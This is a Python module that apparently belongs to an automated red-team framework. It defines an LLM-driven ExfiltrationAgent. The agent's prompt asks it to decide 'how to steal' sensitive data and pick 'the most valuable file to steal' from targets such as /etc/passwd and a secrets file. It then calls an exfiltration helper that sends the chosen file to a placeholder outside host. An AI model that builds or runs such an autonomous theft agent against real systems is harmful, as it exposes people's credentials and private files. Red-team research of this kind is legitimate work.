import dspy
from .base import BaseRedAgent
from tools.interface import exfiltrate_data

class ExfilSignature(dspy.Signature):
    """Decide which data is sensitive and how to steal it."""
    file_list = dspy.InputField()
    priority_file = dspy.OutputField(desc="The most valuable file to steal")

class ExfiltrationAgent(BaseRedAgent):
    def __init__(self):
        super().__init__("EXFIL", "Steal sensitive data.")
        self.decider = dspy.ChainOfThought(ExfilSignature)

    def execute(self, session_id):
        # In a real scenario, we'd use the Collection Agent to get this list first
        dummy_files = ["/etc/passwd", "/home/user/secrets.txt"]
        
        target = self.decider(file_list=str(dummy_files))
        priority_file = getattr(target, 'priority_file', None) or (target and str(target))
        self.log(f"Exfiltrating {priority_file}...")

        success = exfiltrate_data(session_id, priority_file, "100.x.y.z")
        if success:
            return {"status": "DATA_EXFILTRATED", "file": priority_file}
        return {"status": "FAILED"}